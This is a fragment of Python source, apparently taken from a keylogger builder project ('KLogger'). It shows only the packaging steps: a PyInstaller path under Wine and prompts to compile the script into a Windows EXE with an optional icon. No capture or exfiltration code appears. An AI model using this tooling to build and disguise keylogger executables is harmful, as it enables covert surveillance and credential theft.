# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\_0xsojalsec_klogger.py\logger_da95baab7a7e.py
# NOTE: extracted with static-only rules; review before use

# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-KLogger\logger.py
...
from Utils.banne_r import BOOLD, WI, B, F, G, Q, R, X, Y, banner, bl, res
...
class EngyRun:
    ...
    def CompilinG_Linux(self):
        pyinstaller_path = os.path.expanduser(
            "~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
        )
    ...
    def packing(self):
        self.compiling = self.colored_input(
            X + f"{B}compiling {WI}({X}Py{WI}) {B}TO {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",
            spaces=8,
        )

        if self.compiling == "y" or self.compiling == "Y":
            self.ico = self.colored_input(
                X + f"{B}You want set {X}icon ? {WI}({X}Y {WI}&& {R}N{WI}){WI}",
                spaces=12,
            )
    ...
    def packing_linux(self):
        self.compiling = self.colored_input(
            X + f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",
            spaces=12,
        )
